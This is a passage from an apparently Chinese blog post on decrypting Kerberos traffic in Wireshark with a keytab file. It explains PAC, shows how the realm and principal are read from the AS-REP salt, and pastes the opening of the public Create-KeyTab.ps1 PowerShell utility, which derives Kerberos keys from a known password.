<blockquote>
<p>关于 PAC (特权属性证书) 的补充说明:</p>
<p>PAC 是微软为 Kerberos 协议引入的关键扩展，其核心作用是在票据中嵌入用户的身份标识和组信息，从而解决标准协议无法区分用户权限的问题。为确保其安全性和完整性，PAC 被封装在由 KDC 密钥加密的 TGT 内部，并且其本身附加了分别由 KDC 密钥和服务端密码哈希加密的两个数字签名。在最终的授权阶段，服务端会将这些签名提交给 KDC 进行有效性校验，KDC 在确认 PAC 未被篡改后，才会依据其中的用户信息返回最终的权限判定。</p>
</blockquote>
<h3 id="解密Kerberos认证加密的流量"><a href="#解密Kerberos认证加密的流量" class="headerlink" title="解密Kerberos认证加密的流量"></a>解密Kerberos认证加密的流量</h3><p>解密 Kerberos 认证加密的流量，需要制作 keytab 文件，并在 wireshark 中 协议 -&gt; KRB5 导入制作好的 keytab 文件</p>
<p><img src="/imgs/image-20251105142610867.png" srcset="/img/loading.gif" lazyload></p>
<p>制作 keytab 文件所需的 Realm(域名) 和 principal(主体名) 可以从 KRB5 的 AS-REP 中获取（这里要特别注意大小写）</p>
<p>因为这里的 salt（加密派生盐值）是 Realm + principal，并且保留了大小写，因此我们直接使用 salt 中的信息即可</p>
<p><img src="/imgs/image-20251105142832603.png" srcset="/img/loading.gif" lazyload></p>
<p>然后就可以用下面这几个方法制作 keytab 文件</p>
<p>方法一：可以借助<a target="_blank" rel="noopener" href="https://github.com/TheRealAdamBurford/Create-KeyTab">这个项目</a>生成 keytab 文件</p>
<p><img src="/imgs/image-20251105142512436.png" srcset="/img/loading.gif" lazyload></p>
<p>为了预防线下断网的情况，我这里也贴一份这个 ps1 脚本</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">&lt;#PSScriptInfo</span><br><span class="hljs-comment">.VERSION 1.0.2</span><br><span class="hljs-comment">.GUID 325f7f9a-87be-42ec-ba96-c5e423718284</span><br><span class="hljs-comment">.AUTHOR TRAB</span><br><span class="hljs-comment">.COMPANYNAME</span><br><span class="hljs-comment">.COPYRIGHT</span><br><span class="hljs-comment">.TAGS KeyTab Ktpass Key Tab</span><br><span class="hljs-comment">.LICENSEURI https://github.com/TheRealAdamBurford/Create-KeyTab/blob/master/LICENSE</span><br><span class="hljs-comment">.PROJECTURI https://github.com/TheRealAdamBurford/Create-KeyTab</span><br><span class="hljs-comment">.ICONURI</span><br><span class="hljs-comment">.EXTERNALMODULEDEPENDENCIES </span><br><span class="hljs-comment">.REQUIREDSCRIPTS</span><br><span class="hljs-comment">.EXTERNALSCRIPTDEPENDENCIES</span><br><span class="hljs-comment">.RELEASENOTES</span><br><span class="hljs-comment">.PRIVATEDATA</span><br><span class="hljs-comment">#&gt;</span><br><br><span class="hljs-comment">&lt;# </span><br><span class="hljs-comment"><span class="hljs-doctag">.DESCRIPTION</span> </span><br><span class="hljs-comment"> This scipt will generate off-line keytab files for use with Active Directory (AD). While the script is designed to work independently of AD, this script can be used with a wrapper script that uses Get-ADUser or Get-ADObject to retrieve the UPN of a samaccountname or a list of samaccountnames for use in batch processing of KeyTab creation. More information at https://therealadamburford.github.io/Create-KeyTab/ </span><br><span class="hljs-comment">#&gt;</span> <br><span class="hljs-comment">##########################################################</span><br><span class="hljs-comment">###</span><br><span class="hljs-comment">###      Create-KeyTab.ps1</span><br><span class="hljs-comment">###</span><br><span class="hljs-comment">###      Created : 2019-10-26</span><br><span class="hljs-comment">###      Modified: 2020-10-26</span><br><span class="hljs-comment">###</span><br><span class="hljs-comment">###      Created By : Adam Burford</span><br><span class="hljs-comment">###      Modified By: Adam Burford</span><br><span class="hljs-comment">###</span><br><span class="hljs-comment">###</span><br><span class="hljs-comment">### Notes: Create RC4-HMAC, AES128. AES256 KeyTab file. Does not use AD. </span><br><span class="hljs-comment">### Password, ServicePRincipal/UPN must be set on AD account.</span><br><span class="hljs-comment">### Future add may include option AD lookup for Kvno, SPN and UPN.</span><br><span class="hljs-comment">###</span><br><span class="hljs-comment">### 2019-11-11 - Added custom SALT option</span><br><span class="hljs-comment">### 2019-11-11 - Added current Epoch Time Stamp.</span><br><span class="hljs-comment">### 2019-11-12 - Added -Append option</span><br><span class="hljs-comment">### 2019-11-12 - Added -Quiet and -NoPrompt switches for use in batch mode</span><br><span class="hljs-comment">### 2019-11-14 - Added support for UPN format primary/principal (e.g. host/www.domain.com). The principal is split into an array. </span><br><span class="hljs-comment">###              The slash is removed from the SALT calculation.</span><br><span class="hljs-comment">###</span><br><span class="hljs-comment">### 2019-11-18 - Changed output text. RC4,AES128,AES256</span><br><span class="hljs-comment">### 2019-11-18 - Created static nFold output.</span><br><span class="hljs-comment">### 2019-11-26 - Added a Get-Password function to mask password prompt input</span><br><span class="hljs-comment">### 2020-01-30 - Add Info for posting to https://www.powershellgallery.com</span><br><span class="hljs-comment">### 2020-09-15 - Added suggested use of [decimal]::Parse from &quot;https://github.com/matherm-aboehm&quot; to fix timestamp error on localized versions of Windows. Line 535.</span><br><span class="hljs-comment">### 2020-10-26 - Add KRB5_NT_SRV_HST to possible PType values</span><br><span class="hljs-comment">###</span><br><span class="hljs-comment">##########################################################</span><br><span class="hljs-comment">### Attribution:</span><br><span class="hljs-comment">### https://tools.ietf.org/html/rfc3961</span><br><span class="hljs-comment">### https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625?redirectedfrom=MSDN</span><br><span class="hljs-comment">### https://github.com/dfinke/powershell-algorithms/blob/master/src/algorithms/math/euclidean-algorithm/euclideanAlgorithm.ps1</span><br><span class="hljs-comment">### https://afana.me/archive/2016/12/29/how-mit-keytab-files-store-passwords.aspx/</span><br><span class="hljs-comment">### http://www.ioplex.com/utilities/keytab.txt</span><br><br><span class="hljs-comment">&lt;#</span><br><span class="hljs-comment"><span class="hljs-doctag">.SYNOPSIS</span></span><br><span class="hljs-comment">This script will generate and append version 502 KeyTab files</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.DESCRIPTION</span></span><br><span class="hljs-comment">Required Parameters</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">-Realm     : The Realm for the KeyTab</span><br><span class="hljs-comment">-Principal : The Principal for the KeyTab. Case sensative for AES SALT. Default REALM+Principal</span><br><span class="hljs-comment">-Password  : </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Optional Parameters</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">-SALT      : Use a custom SALT</span><br><span class="hljs-comment">-File      : KeyTab File Path. Default = CurrentDirectory\login.keytab</span><br><span class="hljs-comment">-KVNO      : Default = 1. Exceeding 255 will wrap the KVNO. THe 32bit KVNO field is not implimented.</span><br><span class="hljs-comment">-PType     : Default = KRB5_NT_PRINCIPAL</span><br><span class="hljs-comment">-RC4       : Generate RC4 Key</span><br><span class="hljs-comment">-AES128    : Generate AES128 Key</span><br><span class="hljs-comment">-AES256    : Generate AES256 Key - This is default if no Etype switch is set.</span><br><span class="hljs-comment">-Append    : Append Key Data to an existing KeyTab file.</span><br><span class="hljs-comment">-Quiet     : Suppress Text Output</span><br><span class="hljs-comment">-NoPrompt  : Suppress Write KeyTab File Prompt</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">.\Create-KeyTab.ps1</span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">.\Create-KeyTab.ps1 -AES256 -AES128 -RC4</span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">.\Create-KeyTab.ps1 -AES256 -AES128 -Append</span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">.\Create-KeyTab.ps1 -AES256 -AES128 -SALT &quot;MY.REALM.COMprincipalname&quot;</span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">.\Create-KeyTab.ps1 -Realm &quot;MY.REALM.COM&quot; -Principal &quot;principalname&quot; -Password &quot;Secret&quot; -File &quot;c:\temp\login.keytab&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.NOTES</span></span><br><span class="hljs-comment">Use -QUIET and -NOPROMPT for batch mode processing.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.LINK</span></span><br><span class="hljs-comment">https://www<span class="hljs-doctag">.link</span>edin.com/in/adamburford</span><br><span class="hljs-comment">#&gt;</span><br><span class="hljs-keyword">param</span> (<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>,<span class="hljs-type">HelpMessage</span>=<span class="hljs-string">&quot;REALM name will be forced to Upper Case&quot;</span>)]<span class="hljs-variable">$Realm</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>,<span class="hljs-type">HelpMessage</span>=<span class="hljs-string">&quot;Principal is case sensative. It must match the principal portion of the UPN&quot;</span>,<span class="hljs-type">ValueFromPipelineByPropertyName</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$Principal</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$false</span>)]<span class="hljs-variable">$Password</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$false</span>)]<span class="hljs-variable">$SALT</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$false</span>)]<span class="hljs-variable">$File</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$false</span>,<span class="hljs-type">ValueFromPipelineByPropertyName</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$KVNO</span>=<span class="hljs-number">1</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$false</span>)][<span class="hljs-type">ValidateSet</span>(<span class="hljs-string">&quot;KRB5_NT_PRINCIPAL&quot;</span>, <span class="hljs-string">&quot;KRB5_NT_SRV_INST&quot;</span>, <span class="hljs-string">&quot;KRB5_NT_SRV_HST&quot;</span>, <span class="hljs-string">&quot;KRB5_NT_UID&quot;</span>)][<span class="hljs-built_in">String</span>[]]<span class="hljs-variable">$PType</span>=<span class="hljs-string">&quot;KRB5_NT_PRINCIPAL&quot;</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$false</span>)][<span class="hljs-type">Switch</span>]<span class="hljs-variable">$RC4</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$false</span>)][<span class="hljs-type">Switch</span>]<span class="hljs-variable">$AES128</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$false</span>)][<span class="hljs-type">Switch</span>]<span class="hljs-variable">$AES256</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$false</span>)][<span class="hljs-type">Switch</span>]<span class="hljs-variable">$Append</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$false</span>)][<span class="hljs-type">Switch</span>]<span class="hljs-variable">$Quiet</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$false</span>)][<span class="hljs-type">Switch</span>]<span class="hljs-variable">$NoPrompt</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-MD4</span></span>&#123;<br>    <span class="hljs-keyword">PARAM</span>(<br>        [<span class="hljs-built_in">String</span>]<span class="hljs-variable">$String</span>,<br>        [<span class="hljs-built_in">Byte</span>[]]<span class="hljs-variable">$bArray</span>,<br>        [<span class="hljs-type">Switch</span>]<span class="hljs-variable">$UpperCase</span><br>    )<br>    <br>    <span class="hljs-comment"># Author: Larry.Song@outlook.com</span><br>    <span class="hljs-comment"># https://github.com/LarrysGIT/MD4-powershell</span><br>    <span class="hljs-comment"># Reference: https://tools.ietf.org/html/rfc1320</span><br>    <span class="hljs-comment"># MD4(&#x27;abc&#x27;): a448017aaf21d8525fc10ae87aa6729d</span><br>    <span class="hljs-variable">$Array</span> = [<span class="hljs-built_in">byte</span>[]]<span class="hljs-selector-tag">@</span>()<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$String</span>)<br>    &#123;<br>        <span class="hljs-variable">$Array</span> = [<span class="hljs-built_in">byte</span>[]]<span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$String</span>.ToCharArray() | %&#123;[<span class="hljs-built_in">int</span>]<span class="hljs-variable">$_</span>&#125;)<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$bArray</span>)<br>    &#123;<br>        <span class="hljs-variable">$Array</span> = <span class="hljs-variable">$bArray</span><br>    &#125;<br>    <span class="hljs-comment"># padding 100000*** to length 448, last (64 bits / 8) 8 bytes fill with original length</span><br>    <span class="hljs-comment"># at least one (512 bits / 8) 64 bytes array</span><br>    <span class="hljs-variable">$M</span> = <span class="hljs-built_in">New-Object</span> Byte[] (([<span class="hljs-type">math</span>]::Floor(<span class="hljs-variable">$Array</span>.Count/<span class="hljs-number">64</span>) + <span class="hljs-number">1</span>) * <span class="hljs-number">64</span>)<br>    <span class="hljs-comment"># copy original byte array, start from index 0</span><br>    <span class="hljs-variable">$Array</span>.CopyTo(<span class="hljs-variable">$M</span>, <span class="hljs-number">0</span>)<br>    <span class="hljs-comment"># padding bits 1000 0000</span><br>    <span class="hljs-variable">$M</span>[<span class="hljs-variable">$Array</span><span class="hljs-type">.Count</span>] = <span class="hljs-number">0</span>x80<br>    <span class="hljs-comment"># padding bits 0000 0000 to fill length (448 bits /8) 56 bytes</span><br>    <span class="hljs-comment"># Default value is 0 when creating a new byte array, so, no action</span><br>    <span class="hljs-comment"># padding message length to the last 64 bits</span><br>    <span 